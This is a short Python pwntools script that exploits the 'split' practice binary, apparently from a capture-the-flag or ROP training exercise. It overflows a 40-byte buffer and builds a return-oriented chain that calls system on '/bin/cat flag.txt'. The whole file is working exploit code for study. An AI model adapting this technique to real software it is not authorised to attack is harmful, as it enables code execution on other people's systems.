# strings split | grep /bin
# /bin/ls
# /bin/cat flag.txt


from pwn import *

elf = context.binary = ELF('./split', checksec=False)
context.log_level = 'debug'

io = process()

offset = 40
ret = 0x40053e

rop = ROP(elf)
rop.system(next(elf.search(b'/bin/cat flag.txt\x00')))

payload = flat(
	b'A' * offset,
	ret,
	rop.chain()
)

io.sendline(payload)
io.interactive()
